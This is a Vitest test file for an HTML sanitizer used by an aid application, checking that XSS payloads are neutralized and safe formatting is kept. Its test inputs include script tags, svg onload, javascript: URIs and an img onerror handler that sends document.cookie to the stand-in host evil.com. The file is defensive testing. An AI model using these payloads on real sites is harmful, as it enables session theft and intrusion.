import { describe, it, expect } from 'vitest';
import React from 'react';
import { render } from '@testing-library/react';
import {
  sanitizeHtml,
  sanitizeText,
  SanitizedHtml,
  ALLOWED_TAGS,
  ALLOWED_ATTR,
  SANITIZER_CONFIG,
} from '../src/lib/htmlSanitizer';

describe('HTML Sanitizer & XSS Neutralization (Issue 4)', () => {
  describe('XSS payload neutralization', () => {
    it('strips script tags and inner executable script code', () => {
      const malicious = '<script>alert("pwned")</script><b>Help needed</b>';
      const clean = sanitizeHtml(malicious);
      expect(clean).not.toContain('<script>');
      expect(clean).not.toContain('alert("pwned")');
      expect(clean).toContain('<b>Help needed</b>');
    });

    it('neutralizes event handler attributes like onerror, onload, onclick', () => {
      const malicious = '<img src="invalid.jpg" onerror="fetch(\'https://evil.com/?c=\'+document.cookie)" />';
      const clean = sanitizeHtml(malicious);
      expect(clean).not.toContain('onerror');
      expect(clean).not.toContain('fetch');
      expect(clean).not.toContain('<img'); // img is not in allowed tags
    });

    it('neutralizes javascript: URIs in anchors', () => {
      const malicious = '<a href="javascript:alert(1)">Click for emergency aid</a>';
      const clean = sanitizeHtml(malicious);
      expect(clean).not.toContain('javascript:');
      expect(clean).toContain('Click for emergency aid');
    });

    it('neutralizes svg onload and other nested payloads', () => {
      const malicious = '<svg onload="alert(document.domain)"><circle r="10"/></svg>';
      const clean = sanitizeHtml(malicious);
      expect(clean).not.toContain('<svg');
      expect(clean).not.toContain('onload');
    });

    it('neutralizes iframe and object embeddings', () => {
      const malicious = '<iframe src="https://evil.com"></iframe><object data="evil.swf"></object>';
      const clean = sanitizeHtml(malicious);
      expect(clean).not.toContain('<iframe');
      expect(clean).not.toContain('<object');
    });
  });

  describe('Allowed formatting preservation', () => {
    it('preserves safe formatting tags unchanged', () => {
      const formatted = '<p>Patient has <strong>severe asthma</strong>. <em>Carries inhaler</em>.</p>';
      const clean = sanitizeHtml(formatted);
      expect(clean).toBe(formatted);
    });

    it('preserves list tags and line breaks', () => {
      const formatted = '<ul><li>Water</li><li>Blankets</li><li>Insulin</li></ul><br>';
      const clean = sanitizeHtml(formatted);
      expect(clean).toContain('<ul><li>Water</li><li>Blankets</li><li>Insulin</li></ul>');
    });

    it('preserves safe links with allowed attributes', () => {
      const formatted = '<a href="https://helphone.org" title="HelPhone Organization" target="_blank" rel="noopener">Official Link</a>';
      const clean = sanitizeHtml(formatted);
      expect(clean).toContain('href="https://helphone.org"');
      expect(clean).toContain('title="HelPhone Organization"');
      expect(clean).toContain('Official Link');
    });

    it('preserves code blocks', () => {
      const formatted = '<pre><code>coords: 40.7128,-74.0060</code></pre>';
      const clean = sanitizeHtml(formatted);
      expect(clean).toBe(formatted);
    });
  });

  describe('sanitizeText', () => {
    it('strips all HTML tags and returns only text', () => {
      const dirty = '<b onmouseover="alert(1)">Alice <script>alert(2)</script>Walker</b>';
      const text = sanitizeText(dirty);
      expect(text).toBe('Alice Walker');
      expect(text).not.toContain('<');
      expect(text).not.toContain('>');
    });

    it('handles null and undefined gracefully', () => {
      expect(sanitizeText(null)).toBe('');
      expect(sanitizeText(undefined)).toBe('');
      expect(sanitizeHtml(null)).toBe('');
      expect(sanitizeHtml(undefined)).toBe('');
    });
  });

  describe('Single source of truth', () => {
    it('exports immutable allowed tags and attributes matching the configuration', () => {
      expect(ALLOWED_TAGS).toContain('b');
      expect(ALLOWED_TAGS).toContain('strong');
      expect(ALLOWED_TAGS).toContain('a');
      expect(ALLOWED_ATTR).toContain('href');
      expect(SANITIZER_CONFIG.ALLOWED_TAGS).toEqual([...ALLOWED_TAGS]);
      expect(SANITIZER_CONFIG.ALLOWED_ATTR).toEqual([...ALLOWED_ATTR]);
    });
  });

  describe('SanitizedHtml React Component', () => {
    it('renders sanitized HTML safely into the DOM', () => {
      const { container } = render(
        <SanitizedHtml
          html='<p>Safe <strong>note</strong><script>alert("bad")</script></p>'
          data-testid="safe-note"
        />
      );
      expect(container.querySelector('strong')?.textContent).toBe('note');
      expect(container.querySelector('script')).toBeNull();
      expect(container.textContent).toContain('Safe note');
      expect(container.textContent).not.toContain('bad');
    });
  });
});
